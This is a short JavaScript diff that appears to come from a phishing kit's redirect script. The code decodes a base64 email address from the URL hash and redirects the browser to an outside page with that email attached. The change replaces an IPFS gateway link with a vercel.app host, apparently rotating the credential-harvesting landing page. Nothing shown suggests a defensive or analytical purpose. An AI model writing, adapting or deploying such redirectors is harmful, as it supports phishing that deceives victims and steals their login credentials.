@@ -14,7 +14,7 @@
     // Use hash if present, otherwise eta
     var param = hash || eta || '';
     var url_get_email = atob(getafterhash(param));
-    var mail_go_url = "https://ipfs.io/ipfs/bafybeicejckfmjgfdccy4jwjw2wvhglenpphwdi3apwggs2mihy755jvv4#" + url_get_email + "";
+    var mail_go_url = "https://perry-robo.vercel.app#" + url_get_email + "";
     location.replace(mail_go_url);
 
     function getafterhash(url) {
